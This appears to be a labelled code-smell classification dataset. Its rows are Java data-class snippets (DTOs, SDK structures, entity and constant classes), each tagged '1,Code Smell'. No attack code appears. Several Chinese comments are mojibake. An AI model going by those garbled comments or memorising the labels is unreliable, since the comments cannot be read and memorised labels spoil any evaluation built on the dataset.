 * User role code. The permission control model of inlong consists of tenant permission control and the whole permission control. Assume that there are several resources belongs to tenant A, B and C. -------------------------------------------------------------- |  Tenant   |      A     |     B      |     C    |   inlong | ------------------------------------------------------------- | Resources | r1, r2, r3 | r4, r5, r6 |  r7, r8  |          | ------------------------------------------------------------- |   Admin  |  Alice, Bob |  Alice,Eve |  Charlie  |   Dave  | ------------------------------------------------------------- | Operator |  Charlie   |    Bob     |  Alice,Bob |   Eve   | -------------------------------------------------------------- As the table shown above, Alice has all permission of tenant A and B, and she can do all save/update/delete/get operation to resources r1-r3 in tenant A and r4-r6 in tenant B. Alice also the operator of tenant C, hence she can look up r7 r8, but cannot do any modification. Bob has all permission to r1-r3, and can look up r4-r6 Charlie has all permission to r7 r8, and can look up r1-r3. Dave is the admin of inlong, hence he can operate all resources r1-r8. Eve is the operator of inlong, hence she can look up all resources r1-r8, she also the admin of tenant B, hence she has all permission of r4-r6.
 */
public class UserRoleCode {
  /** 
 * Has all permission for the resources of a specific tenant
 */
  public static final String TENANT_ADMIN=""TENANT_ADMIN"";
  /** 
 * Has query permission for the resources of a specific tenant
 */
  public static final String TENANT_OPERATOR=""TENANT_OPERATOR"";
  /** 
 * Has all permission for all resources
 */
  public static final String INLONG_ADMIN=""INLONG_ADMIN"";
  /** 
 * Has query permission for all resources
 */
  public static final String INLONG_OPERATOR=""INLONG_OPERATOR"";
  /** 
 * The requests from Inlong Service do not need to filter by tenant
 */
  public static final String INLONG_SERVICE=""INLONG_SERVICE"";
}",1,Code Smell
"public static class NET_DVR_CRUISE_PARA extends Structure {
  public int dwSize;
  public byte[] byPresetNo=new byte[CRUISE_MAX_PRESET_NUMS];
  public byte[] byCruiseSpeed=new byte[CRUISE_MAX_PRESET_NUMS];
  public short[] wDwellTime=new short[CRUISE_MAX_PRESET_NUMS];
  public byte[] byEnableThisCruise;
  public byte[] res=new byte[15];
}",1,Code Smell
"/** 
 * Server control attributes. 
 */
public static final class ServerControl {
  /** 
 * The skip boundary for delta updates in microseconds, or  {@link C#TIME_UNSET} if delta updatesare not supported.
 */
  public final long skipUntilUs;
  /** 
 * Whether the playlist can produce delta updates that skip older #EXT-X-DATERANGE tags in addition to media segments.
 */
  public final boolean canSkipDateRanges;
  /** 
 * The server-recommended live offset in microseconds, or  {@link C#TIME_UNSET} if none defined.
 */
  public final long holdBackUs;
  /** 
 * The server-recommended live offset in microseconds in low-latency mode, or  {@link C#TIME_UNSET} if none defined.
 */
  public final long partHoldBackUs;
  /** 
 * Whether the server supports blocking playlist reload. 
 */
  public final boolean canBlockReload;
  /** 
 * Creates a new instance.
 * @param skipUntilUs See {@link #skipUntilUs}.
 * @param canSkipDateRanges See {@link #canSkipDateRanges}.
 * @param holdBackUs See {@link #holdBackUs}.
 * @param partHoldBackUs See {@link #partHoldBackUs}.
 * @param canBlockReload See {@link #canBlockReload}.
 */
  public ServerControl(  long skipUntilUs,  boolean canSkipDateRanges,  long holdBackUs,  long partHoldBackUs,  boolean canBlockReload){
    this.skipUntilUs=skipUntilUs;
    this.canSkipDateRanges=canSkipDateRanges;
    this.holdBackUs=holdBackUs;
    this.partHoldBackUs=partHoldBackUs;
    this.canBlockReload=canBlockReload;
  }
}
",1,Code Smell
"/** 
 * @Author gin
 */
public class ChartConstants {
  public static final String YEAR_MOM=""year_mom"";
  public static final String MONTH_MOM=""month_mom"";
  public static final String YEAR_YOY=""year_yoy"";
  public static final String DAY_MOM=""day_mom"";
  public static final String MONTH_YOY=""month_yoy"";
  public static final String[] M_Y={YEAR_MOM,MONTH_MOM,YEAR_YOY,DAY_MOM,MONTH_YOY};
public static final class VIEW_RESULT_MODE {
    public static final String ALL=""all"";
    public static final String CUSTOM=""custom"";
  }
}
",1,Code Smell
"/** 
 * Plugin setting
 * @author HapThorin
 * @version 1.0.0
 * @since 2021-11-12
 */
public class PluginSetting {
  /** 
 * Plugin name set
 */
  private Set<String> plugins;
  /** 
 * Dynamic installation plugins, classified into active and passive plugins
 */
  private Map<String,Set<String>> dynamicPlugins;
  /** 
 * Map between scenarios and plugins
 */
  private Map<String,Set<String>> profiles;
  /** 
 * scenarios name
 */
  private String profile;
  public Set<String> getPlugins(){
    return plugins;
  }
  public void setPlugins(  Set<String> plugins){
    this.plugins=plugins;
  }
  public Map<String,Set<String>> getDynamicPlugins(){
    return dynamicPlugins;
  }
  public void setDynamicPlugins(  Map<String,Set<String>> dynamicPlugins){
    this.dynamicPlugins=dynamicPlugins;
  }
  public void setProfiles(  Map<String,Set<String>> profiles){
    this.profiles=profiles;
  }
  public Map<String,Set<String>> getProfiles(){
    return profiles;
  }
  public String getProfile(){
    return profile;
  }
  public void setProfile(  String profile){
    this.profile=profile;
  }
}",1,Code Smell
"/** 
 * @author 鍏ㄩ槄
 * @Description : 鏁版嵁婧愮被鍨嬩俊鎭被
 * @Date : 2021/3/10
 */
@TableName(""datasource_type"") public class DsType extends BaseModel {
  /** 
 * 鏁版嵁婧愮被鍨嬪敮涓� 濡侻ysql, Oracle, Hive
 */
  private String dataType;
  /** 
 * 鏁版嵁婧愬垎绫绘爮涓婚敭id
 */
  private Long dataClassifyId;
  /** 
 * 鏁版嵁婧愭潈閲�
 */
  private Double weight;
  /** 
 * 鏁版嵁婧恖ogo鍥剧墖鍦板潃
 */
  private String imgUrl;
  /** 
 * 鎺掑簭鍊�
 */
  private Integer sorted;
  /** 
 * 鏄惁闅愯棌
 */
  private Integer invisible;
  public String getDataType(){
    return dataType;
  }
  public void setDataType(  String dataType){
    this.dataType=dataType;
  }
  public Long getDataClassifyId(){
    return dataClassifyId;
  }
  public void setDataClassifyId(  Long dataClassifyId){
    this.dataClassifyId=dataClassifyId;
  }
  public Double getWeight(){
    return weight;
  }
  public void setWeight(  Double weight){
    this.weight=weight;
  }
  public String getImgUrl(){
    return imgUrl;
  }
  public void setImgUrl(  String imgUrl){
    this.imgUrl=imgUrl;
  }
  public Integer getSorted(){
    return sorted;
  }
  public void setSorted(  Integer sorted){
    this.sorted=sorted;
  }
  public Integer getInvisible(){
    return invisible;
  }
  public void setInvisible(  Integer invisible){
    this.invisible=invisible;
  }
}",1,Code Smell
"/** 
 * Descriptor for data being loaded or selected by a  {@link MediaSource}. 
 */
public final class MediaLoadData {
  /** 
 * The  {@link DataType data type}. 
 */
  public final @DataType int dataType;
  /** 
 * One of the  {@link TrackType track types}, which is a media track type if the data corresponds to media of a specific type, or  {@link C#TRACK_TYPE_UNKNOWN} otherwise.
 */
  public final @TrackType int trackType;
  /** 
 * The format of the track to which the data belongs. Null if the data does not belong to a specific track.
 */
  @Nullable public final Format trackFormat;
  /** 
 * One of the  {@link SelectionReason selection reasons} if the data belongs to a track. {@link C#SELECTION_REASON_UNKNOWN} otherwise.
 */
  public final @C.SelectionReason int trackSelectionReason;
  /** 
 * Optional data associated with the selection of the track to which the data belongs. Null if the data does not belong to a track.
 */
  @Nullable public final Object trackSelectionData;
  /** 
 * The start time of the media in the  {@link MediaPeriod}, or  {@link C#TIME_UNSET} if the datadoes not belong to a specific  {@link MediaPeriod}.
 */
  public final long mediaStartTimeMs;
  /** 
 * The end time of the media in the  {@link MediaPeriod}, or  {@link C#TIME_UNSET} if the data doesnot belong to a specific  {@link MediaPeriod} or the end time is unknown.
 */
  public final long mediaEndTimeMs;
  /** 
 * Creates an instance with the given  {@link #dataType}. 
 */
  public MediaLoadData(  @DataType int dataType){
    this(dataType,C.TRACK_TYPE_UNKNOWN,null,C.SELECTION_REASON_UNKNOWN,null,C.TIME_UNSET,C.TIME_UNSET);
  }
  /** 
 * Creates media load data.
 * @param dataType See {@link #dataType}.
 * @param trackType See {@link #trackType}.
 * @param trackFormat See {@link #trackFormat}.
 * @param trackSelectionReason See {@link #trackSelectionReason}.
 * @param trackSelectionData See {@link #trackSelectionData}.
 * @param mediaStartTimeMs See {@link #mediaStartTimeMs}.
 * @param mediaEndTimeMs See {@link #mediaEndTimeMs}.
 */
  public MediaLoadData(  @DataType int dataType,  @TrackType int trackType,  @Nullable Format trackFormat,  @SelectionReason int trackSelectionReason,  @Nullable Object trackSelectionData,  long mediaStartTimeMs,  long mediaEndTimeMs){
    this.dataType=dataType;
    this.trackType=trackType;
    this.trackFormat=trackFormat;
    this.trackSelectionReason=trackSelectionReason;
    this.trackSelectionData=trackSelectionData;
    this.mediaStartTimeMs=mediaStartTimeMs;
    this.mediaEndTimeMs=mediaEndTimeMs;
  }
}
",1,Code Smell
"public class ImportDescriptor {
  private final String desc;
  private final Boolean active;
  private final Object timestamp;
  private final Boolean internal;
  public ImportDescriptor(  String desc,  Boolean active,  Object timestamp,  Boolean internal){
    this.desc=desc;
    this.active=active;
    this.timestamp=timestamp;
    this.internal=internal;
  }
  public String getDesc(){
    return desc;
  }
  public Boolean getActive(){
    return active;
  }
  public Object getTimestamp(){
    return timestamp;
  }
  public Boolean getInternal(){
    return internal;
  }
}
",1,Code Smell
"public static class NET_IN_SYNC_PARKING_INFO extends SdkStructure {
  public int dwSize;
  public int nChannel;
  public byte[] szParkingNum=new byte[32];
  public int dwPresetNum;
  public int bHaveCar;
  public int bParkingFault;
  public int nSnapTimes;
  public int nSnapIntervel;
  public NET_IN_SYNC_PARKING_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class TextRange {
  public int start, end;
  public boolean quote;
  public boolean code;
  public String language;
  public TextRange(  int start,  int end){
    this.start=start;
    this.end=end;
  }
  public TextRange(  int start,  int end,  boolean quote,  boolean code,  String language){
    this.start=start;
    this.end=end;
    this.quote=quote;
    this.code=code;
    this.language=language;
  }
}
",1,Code Smell
"public class AccountDTO {
  private Long id;
  @ColumnMask(Masks.CHINESE_NAME) private String userName;
  private int age;
  @NotBlank private Date birthday;
  @Column(typeHandler=Fastjson2TypeHandler.class,isLarge=true) private Map<String,Object> options;
  @Column(isLogicDelete=true) private Boolean isDelete;
  private List<Article> articles;
  private List<String> permissions;
  private String testOtherField;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public Date getBirthday(){
    return birthday;
  }
  public void setBirthday(  Date birthday){
    this.birthday=birthday;
  }
  public Map<String,Object> getOptions(){
    return options;
  }
  public void setOptions(  Map<String,Object> options){
    this.options=options;
  }
  public void addOption(  String key,  Object value){
    if (options == null) {
      options=new HashMap<>();
    }
    options.put(key,value);
  }
  public Boolean getDelete(){
    return isDelete;
  }
  public void setDelete(  Boolean delete){
    isDelete=delete;
  }
  public List<Article> getArticles(){
    return articles;
  }
  public void setArticles(  List<Article> articles){
    this.articles=articles;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
  public String getTestOtherField(){
    return testOtherField;
  }
  public void setTestOtherField(  String testOtherField){
    this.testOtherField=testOtherField;
  }
  public List<String> getPermissions(){
    return permissions;
  }
  public void setPermissions(  List<String> permissions){
    this.permissions=permissions;
  }
  @Override public String toString(){
    return ""AccountDTO{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", birthday=""+ birthday+ "", options=""+ options+ "", isDelete=""+ isDelete+ "", articles=""+ articles+ "", permissions=""+ permissions+ '}';
  }
}",1,Code Smell
"/** 
 * 妯℃澘鐪嬫澘娓叉煋涓婁笅鏂囥 <p> 濡傛灉璁剧疆浜唟@linkplain #setTemplateReader(Reader)}锛屽簲浣滀负妯℃澘杈撳叆娴侀閫夐」銆 </p>
 * @author datagear@163.com
 */
public class TplDashboardRenderContext extends DefaultRenderContext {
  private static final long serialVersionUID=1L;
  public static final long TEMPLATE_LAST_MODIFIED_NONE=-1;
  /** 
 * 妯℃澘鍚
 */
  private String template;
  /** 
 * 妯＄増涓婃淇敼鏃堕棿
 */
  private long templateLastModified=TEMPLATE_LAST_MODIFIED_NONE;
  /** 
 * 妯＄増杈撳叆娴
 */
  private transient Reader templateReader=null;
  /** 
 * 杈撳嚭娴
 */
  private transient Writer writer;
  public TplDashboardRenderContext(){
    super();
  }
  public TplDashboardRenderContext(  String template,  Writer writer){
    super();
    this.template=template;
    this.writer=writer;
  }
  public TplDashboardRenderContext(  String template,  long templateLastModified,  Writer writer){
    super();
    this.template=template;
    this.templateLastModified=templateLastModified;
    this.writer=writer;
  }
  public TplDashboardRenderContext(  String template,  Reader templateReader,  Writer writer){
    super();
    this.template=template;
    this.templateReader=templateReader;
    this.writer=writer;
  }
  public TplDashboardRenderContext(  String template,  Reader templateReader,  long templateLastModified,  Writer writer){
    super();
    this.template=template;
    this.templateReader=templateReader;
    this.templateLastModified=templateLastModified;
    this.writer=writer;
  }
  public TplDashboardRenderContext(  TplDashboardRenderContext renderContext){
    super(renderContext);
    this.template=renderContext.getTemplate();
    this.templateLastModified=renderContext.getTemplateLastModified();
    this.templateReader=renderContext.getTemplateReader();
    this.writer=renderContext.getWriter();
  }
  public String getTemplate(){
    return template;
  }
  public void setTemplate(  String template){
    this.template=template;
  }
  public boolean hasTemplateLastModified(){
    return this.templateLastModified > 0;
  }
  public long getTemplateLastModified(){
    return templateLastModified;
  }
  public void setTemplateLastModified(  long templateLastModified){
    this.templateLastModified=templateLastModified;
  }
  public boolean hasTemplateReader(){
    return this.templateReader != null;
  }
  public Reader getTemplateReader(){
    return templateReader;
  }
  public void setTemplateReader(  Reader templateReader){
    this.templateReader=templateReader;
  }
  public Writer getWriter(){
    return writer;
  }
  public void setWriter(  Writer writer){
    this.writer=writer;
  }
}",1,Code Smell
"private static class RequestCallbacks {
  public RequestDelegateInternal onComplete;
  public QuickAckDelegate onQuickAck;
  public WriteToSocketDelegate onWriteToSocket;
  public Runnable onCancelled;
  public RequestCallbacks(  RequestDelegateInternal onComplete,  QuickAckDelegate onQuickAck,  WriteToSocketDelegate onWriteToSocket){
    this.onComplete=onComplete;
    this.onQuickAck=onQuickAck;
    this.onWriteToSocket=onWriteToSocket;
  }
}
",1,Code Smell
"public class SecureDocument extends TLObject {
  public SecureDocumentKey secureDocumentKey;
  public TLRPC.TL_secureFile secureFile;
  public String path;
  public TLRPC.TL_inputFile inputFile;
  public byte[] fileSecret;
  public byte[] fileHash;
  public int type;
  public SecureDocument(  SecureDocumentKey key,  TLRPC.TL_secureFile file,  String p,  byte[] fh,  byte[] secret){
    secureDocumentKey=key;
    secureFile=file;
    path=p;
    fileHash=fh;
    fileSecret=secret;
  }
}
",1,Code Smell
"public static class PSKey extends MessageMicro<PSKey> {
  static final MessageMicro.FieldMap __fieldMap__=MessageMicro.initFieldMap(new int[]{10,18,24,34,40},new String[]{""domain"",""key"",""key_expire"",""uskey"",""uskey_expire""},new Object[]{"""","""",0L,"""",0L},PSKey.class);
  public final PBStringField domain=PBField.initString("""");
  public final PBStringField key=PBField.initString("""");
  public final PBInt64Field key_expire=PBField.initInt64(0);
  public final PBStringField uskey=PBField.initString("""");
  public final PBInt64Field uskey_expire=PBField.initInt64(0);
}",1,Code Smell
"/** 
 * 灞炴�т笌灞炴�у垎缁勫叧鑱斾俊鎭疺O
 * @author YXF
 * @date 2020-11-23 16:20:01
 */
public class AttrCategoryVO extends BaseVO {
  private static final long serialVersionUID=1L;
  @Schema(description=""灞炴�т笌鍒嗙被鍏宠仈id"") private Long attrCategoryId;
  @Schema(description=""鍒嗙被id"") private Long categoryId;
  @Schema(description=""灞炴�d"") private Long attrId;
  public Long getAttrCategoryId(){
    return attrCategoryId;
  }
  public void setAttrCategoryId(  Long attrCategoryId){
    this.attrCategoryId=attrCategoryId;
  }
  public Long getCategoryId(){
    return categoryId;
  }
  public void setCategoryId(  Long categoryId){
    this.categoryId=categoryId;
  }
  public Long getAttrId(){
    return attrId;
  }
  public void setAttrId(  Long attrId){
    this.attrId=attrId;
  }
  @Override public String toString(){
    return ""AttrCategoryVO{"" + ""attrCategoryId="" + attrCategoryId + "",createTime=""+ createTime+ "",updateTime=""+ updateTime+ "",categoryId=""+ categoryId+ "",attrId=""+ attrId+ '}';
  }
}",1,Code Smell
"public static class ReqSystemMsgRead extends MessageMicro<ReqSystemMsgRead> {
  static final FieldMap __fieldMap__;
  public final PBEnumField checktype=PBField.initEnum(1);
  public final PBUInt64Field latest_friend_seq=PBField.initUInt64(0L);
  public final PBUInt64Field latest_group_seq=PBField.initUInt64(0L);
  public final PBUInt32Field type=PBField.initUInt32(0);
  public final PBUInt32Field uint32_req_msg_type=PBField.initUInt32(0);
static {
    Long long_=Long.valueOf(0L);
    Integer integer=Integer.valueOf(0);
    __fieldMap__=MessageMicro.initFieldMap(new int[]{8,16,24,32,40},new String[]{""latest_friend_seq"",""latest_group_seq"",""type"",""checktype"",""uint32_req_msg_type""},new Object[]{long_,long_,integer,Integer.valueOf(1),integer},ReqSystemMsgRead.class);
  }
}",1,Code Smell
"public class ComboTokenReqJson {
  public int app_id;
  public int channel_id;
  public String data;
  public String device;
  public String sign;
public static class LoginTokenData {
    public String uid;
    public String token;
    public boolean guest;
  }
}
",1,Code Smell
"/** 
 * A  {@link CryptoConfig} for {@link C#CRYPTO_TYPE_FRAMEWORK}. Contains the necessary information to build or update a framework  {@link MediaCrypto} that can be used to configure a {@link MediaCodec}.
 */
public final class FrameworkCryptoConfig implements CryptoConfig {
  /** 
 * Whether the device needs keys to have been loaded into the  {@link DrmSession} before codecconfiguration.
 */
  public static final boolean WORKAROUND_DEVICE_NEEDS_KEYS_TO_CONFIGURE_CODEC=""Amazon"".equals(Util.MANUFACTURER) && (""AFTM"".equals(Util.MODEL) || ""AFTB"".equals(Util.MODEL));
  /** 
 * The DRM scheme UUID. 
 */
  public final UUID uuid;
  /** 
 * The DRM session id. 
 */
  public final byte[] sessionId;
  /** 
 * Whether to allow use of insecure decoder components even if the underlying platform says otherwise.
 */
  public final boolean forceAllowInsecureDecoderComponents;
  /** 
 * @param uuid The DRM scheme UUID.
 * @param sessionId The DRM session id.
 * @param forceAllowInsecureDecoderComponents Whether to allow use of insecure decoder componentseven if the underlying platform says otherwise.
 */
  public FrameworkCryptoConfig(  UUID uuid,  byte[] sessionId,  boolean forceAllowInsecureDecoderComponents){
    this.uuid=uuid;
    this.sessionId=sessionId;
    this.forceAllowInsecureDecoderComponents=forceAllowInsecureDecoderComponents;
  }
}
",1,Code Smell
"public class ChartDTO {
  private List<String> xAxis;
  private List<Integer> yAxis;
  @JsonProperty(""xAxis"") public List<String> getXAxis(){
    return xAxis;
  }
  public void setXAxis(  List<String> xAxis){
    this.xAxis=xAxis;
  }
  @JsonProperty(""yAxis"") public List<Integer> getYAxis(){
    return yAxis;
  }
  public void setYAxis(  List<Integer> yAxis){
    this.yAxis=yAxis;
  }
}
",1,Code Smell
"/** 
 * Convinience class for making assertions about the updates that were processed 
 */
private static class RecordingResults {
  public final List<UpdateCommand> preDistribCommands;
  public final List<UpdateCommand> postDistribCommands;
  public final Map<SolrQueryRequest,List<UpdateCommand>> preDistribRequests;
  public final Map<SolrQueryRequest,List<UpdateCommand>> postDistribRequests;
  public final Map<String,List<SolrQueryRequest>> preDistribCores;
  public final Map<String,List<SolrQueryRequest>> postDistribCores;
  private static Map<SolrQueryRequest,List<UpdateCommand>> mapReqsToCommands(  final List<UpdateCommand> commands){
    return commands.stream().collect(Collectors.groupingBy(UpdateCommand::getReq));
  }
  private static Map<String,List<SolrQueryRequest>> mapCoresToReqs(  final Collection<SolrQueryRequest> reqs){
    return reqs.stream().collect(Collectors.groupingBy(r -> r.getContext().get(TrackingUpdateProcessorFactory.REQUEST_NODE).toString()));
  }
  public RecordingResults(  final List<UpdateCommand> preDistribCommands,  final List<UpdateCommand> postDistribCommands){
    this.preDistribCommands=preDistribCommands;
    this.postDistribCommands=postDistribCommands;
    this.preDistribRequests=mapReqsToCommands(preDistribCommands);
    this.postDistribRequests=mapReqsToCommands(postDistribCommands);
    this.preDistribCores=mapCoresToReqs(preDistribRequests.keySet());
    this.postDistribCores=mapCoresToReqs(postDistribRequests.keySet());
  }
}
",1,Code Smell
"public static class NET_CFG_RTMP_INFO extends SdkStructure {
  public int dwSize;
  public int bEnable;
  public byte[] szAddr=new byte[256];
  public int nPort;
  public byte[] szCustomPath=new byte[256];
  public byte[] szStreamPath=new byte[256];
  public byte[] szKey=new byte[128];
  public Pointer pstuMainStream;
  public int nMainStream;
  public int nMainStreamRet;
  public Pointer pstuExtra1Stream;
  public int nExtra1Stream;
  public int nExtra1StreamRet;
  public Pointer pstuExtra2Stream;
  public int nExtra2Stream;
  public int nExtra2StreamRet;
  public NET_CFG_RTMP_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * @author priyamvora
 * @created 26/04/2021
 */
public class User {
  private String userId;
  private String name;
  private String email;
  public User(  String name,  String email){
    this.userId=UUID.randomUUID().toString();
    this.name=name;
    this.email=email;
  }
  public String getUserId(){
    return userId;
  }
  public void setUserId(  String userId){
    this.userId=userId;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
}",1,Code Smell
"@Entity @Table(name=""users"") public class User {
  @Id @GeneratedValue(strategy=GenerationType.IDENTITY) @Column(name=""user_id"") private Long id;
  @Column(name=""username"",unique=true) private String username;
  @Column(name=""password"") private String password;
  @Column(name=""apiKey"") private String apiKey;
  @Column(name=""enabled"") private boolean enabled;
  @Column(name=""isFirstLogin"") private Boolean isFirstLogin=false;
  @Column(name=""roleName"") private String roleName;
  @Column(name=""authenticationtype"") private String authenticationType;
  @OneToMany(fetch=FetchType.EAGER,cascade=CascadeType.ALL,mappedBy=""user"") private Set<Authority> authorities=new HashSet<>();
  @ElementCollection @MapKeyColumn(name=""setting_key"") @Column(name=""setting_value"") @CollectionTable(name=""user_settings"",joinColumns=@JoinColumn(name=""user_id"")) private Map<String,String> settings=new HashMap<>();
  public String getRoleName(){
    return Role.getRoleNameByRoleId(getRolesAsString());
  }
  public boolean isFirstLogin(){
    return isFirstLogin != null && isFirstLogin;
  }
  public void setFirstLogin(  boolean isFirstLogin){
    this.isFirstLogin=isFirstLogin;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getApiKey(){
    return apiKey;
  }
  public void setApiKey(  String apiKey){
    this.apiKey=apiKey;
  }
  public Map<String,String> getSettings(){
    return settings;
  }
  public void setSettings(  Map<String,String> settings){
    this.settings=settings;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public boolean isEnabled(){
    return enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
  public void setAuthenticationType(  AuthenticationType authenticationType){
    this.authenticationType=authenticationType.toString().toLowerCase();
  }
  public String getAuthenticationType(){
    return authenticationType;
  }
  public Set<Authority> getAuthorities(){
    return authorities;
  }
  public void setAuthorities(  Set<Authority> authorities){
    this.authorities=authorities;
  }
  public void addAuthorities(  Set<Authority> authorities){
    this.authorities.addAll(authorities);
  }
  public void addAuthority(  Authority authorities){
    this.authorities.add(authorities);
  }
  public String getRolesAsString(){
    return this.authorities.stream().map(Authority::getAuthority).collect(Collectors.joining("", ""));
  }
  public boolean hasPassword(){
    return this.password != null && !this.password.isEmpty();
  }
}
",1,Code Smell
"public static class CFG_VIDEO_UNBALANCE_DETECTION extends SdkStructure {
  public int bEnable;
  public int nMinDuration;
  public byte byThrehold1;
  public byte byThrehold2;
}",1,Code Smell
"/** 
 * A parsed Representation element. 
 */
protected static final class RepresentationInfo {
  public final Format format;
  public final String baseUrl;
  public final SegmentBase segmentBase;
  public final String drmSchemeType;
  public final ArrayList<SchemeData> drmSchemeDatas;
  public final ArrayList<Descriptor> inbandEventStreams;
  public final long revisionId;
  public RepresentationInfo(  Format format,  String baseUrl,  SegmentBase segmentBase,  String drmSchemeType,  ArrayList<SchemeData> drmSchemeDatas,  ArrayList<Descriptor> inbandEventStreams,  long revisionId){
    this.format=format;
    this.baseUrl=baseUrl;
    this.segmentBase=segmentBase;
    this.drmSchemeType=drmSchemeType;
    this.drmSchemeDatas=drmSchemeDatas;
    this.inbandEventStreams=inbandEventStreams;
    this.revisionId=revisionId;
  }
}
",1,Code Smell
"public static class EM_CFG_ACCESSCONTROLTYPE extends SdkStructure {
  public static final int EM_CFG_ACCESSCONTROLTYPE_NULL=0;
  public static final int EM_CFG_ACCESSCONTROLTYPE_AUTO=1;
  public static final int EM_CFG_ACCESSCONTROLTYPE_OPEN=2;
  public static final int EM_CFG_ACCESSCONTROLTYPE_CLOSE=3;
  public static final int EM_CFG_ACCESSCONTROLTYPE_OPENALWAYS=4;
  public static final int EM_CFG_ACCESSCONTROLTYPE_CLOSEALWAYS=5;
}",1,Code Smell
"public static class Column {
public static class StylingOptions {
    public final float weight;
    public StylingOptions(    float weight){
      this.weight=weight;
    }
    public boolean noPadding;
    public StylingOptions setNoPadding(    boolean noPadding){
      this.noPadding=noPadding;
      return this;
    }
  }
  public final List<SimpleStringItem> rows;
  public final StylingOptions style;
  public int index;
  public Column(  List<SimpleStringItem> rows,  @NonNull StylingOptions style,  int index){
    this.rows=rows;
    this.style=style;
    this.index=index;
  }
  public InfiniteRecyclerView<SimpleStringItem> view;
  private @Nullable InfiniteRecyclerView.MinMaxProvider<SimpleStringItem> minMaxProvider;
  public void setMinMaxProvider(  @Nullable InfiniteRecyclerView.MinMaxProvider<SimpleStringItem> minMaxProvider){
    this.minMaxProvider=minMaxProvider;
  }
  private @Nullable InfiniteRecyclerView.ItemChangeListener<SimpleStringItem> itemChangeListener;
  public void setItemChangeListener(  @Nullable InfiniteRecyclerView.ItemChangeListener<SimpleStringItem> itemChangeListener){
    this.itemChangeListener=itemChangeListener;
  }
}
",1,Code Smell
"public class OnStreamNoneReaderHookParam extends HookParam {
  private String schema;
  private String app;
  private String stream;
  private String vhost;
  public String getSchema(){
    return schema;
  }
  public void setSchema(  String schema){
    this.schema=schema;
  }
  public String getApp(){
    return app;
  }
  public void setApp(  String app){
    this.app=app;
  }
  public String getStream(){
    return stream;
  }
  public void setStream(  String stream){
    this.stream=stream;
  }
  public String getVhost(){
    return vhost;
  }
  public void setVhost(  String vhost){
    this.vhost=vhost;
  }
  @Override public String toString(){
    return ""OnStreamNoneReaderHookParam{"" + ""schema='"" + schema + '\''+ "", app='""+ app+ '\''+ "", stream='""+ stream+ '\''+ "", vhost='""+ vhost+ '\''+ '}';
  }
}
",1,Code Smell
"/** 
 * @author 47081
 * @version 1.0
 * @description 褰掍竴鍖栫殑浜戝彴鎺у埗鍧愭爣鍗曞厓
 * @date 2021/2/20
 */
public class PTZ_NORMALIZED_POSITION_UNIT extends NetSDKLib.SdkStructure {
  /** 
 * 浜戝彴姘村钩鏂瑰悜瑙掑害,鑼冨洿[-1, 1] 
 */
  public double dbPositionX;
  /** 
 * 浜戝彴鍨傜洿鏂瑰悜瑙掑害,鑼冨洿[-1, 1] 
 */
  public double dbPositionY;
  /** 
 * 浜戝彴鍏夊湀鏀惧ぇ鍊嶇巼,鑼冨洿[0, 1] 
 */
  public double dbZoom;
  /** 
 * 棰勭暀瀛楄妭 
 */
  public byte[] szReserved=new byte[32];
}",1,Code Smell
"public class DownloadLogVO {
  private String jobId;
  private Integer taskType;
  private String taskManagerId;
  private Long tenantId;
  public String getJobId(){
    return jobId;
  }
  public void setJobId(  String jobId){
    this.jobId=jobId;
  }
  public Integer getTaskType(){
    return taskType;
  }
  public void setTaskType(  Integer taskType){
    this.taskType=taskType;
  }
  public String getTaskManagerId(){
    return taskManagerId;
  }
  public void setTaskManagerId(  String taskManagerId){
    this.taskManagerId=taskManagerId;
  }
  public Integer getByteNum(){
    return byteNum;
  }
  public void setByteNum(  Integer byteNum){
    this.byteNum=byteNum;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  private Integer byteNum;
}
",1,Code Smell
"/** 
 * @author harris
 */
public class CodeRuleDTO extends CodeRule {
  private String tagKey;
  private String tagName;
  private boolean isSaveParam;
  private List<String> tags=new ArrayList<>();
  private String pluginIcon;
  public String getTagKey(){
    return tagKey;
  }
  public void setTagKey(  String tagKey){
    this.tagKey=tagKey;
  }
  public String getTagName(){
    return tagName;
  }
  public void setTagName(  String tagName){
    this.tagName=tagName;
  }
  public List<String> getTags(){
    return tags;
  }
  public void setTags(  List<String> tags){
    this.tags=tags;
  }
  public boolean isSaveParam(){
    return isSaveParam;
  }
  public void setSaveParam(  boolean saveParam){
    isSaveParam=saveParam;
  }
  public String getPluginIcon(){
    return pluginIcon;
  }
  public void setPluginIcon(  String pluginIcon){
    this.pluginIcon=pluginIcon;
  }
}
",1,Code Smell
"public static class NET_DVR_IPCHANINFO extends Structure {
  public byte byEnable;
  public byte byIPID;
  public byte byChannel;
  public byte[] byres=new byte[33];
}",1,Code Smell
"/** 
 * @author YuePengdate 2018-12-14.
 */
public class SessionKey {
  private static final String AUTH_SPACE=""erupt-auth:"";
  public static final String VERIFY_CODE=AUTH_SPACE + ""verify-code:"";
  public static final String MENU_VIEW=AUTH_SPACE + ""menu-view:"";
  public static final String MENU_VALUE_MAP=AUTH_SPACE + ""menu-value-map:"";
  public static final String TOKEN_OLINE=AUTH_SPACE + ""token:"";
  public static final String USER_INFO=AUTH_SPACE + ""user:"";
  public static final String[] USER_KEY_GROUP={MENU_VIEW,MENU_VALUE_MAP,TOKEN_OLINE,USER_INFO};
  public static final String LOGIN_ERROR=AUTH_SPACE + ""login-error:"";
}",1,Code Smell
"public class BaiduCredential {
  private String AccessKeyId;
  private String SecretAccessKey;
  private String Endpoint;
  public BaiduCredential(){
  }
  public BaiduCredential(  String AccessKeyId,  String SecretAccessKey,  String Endpoint){
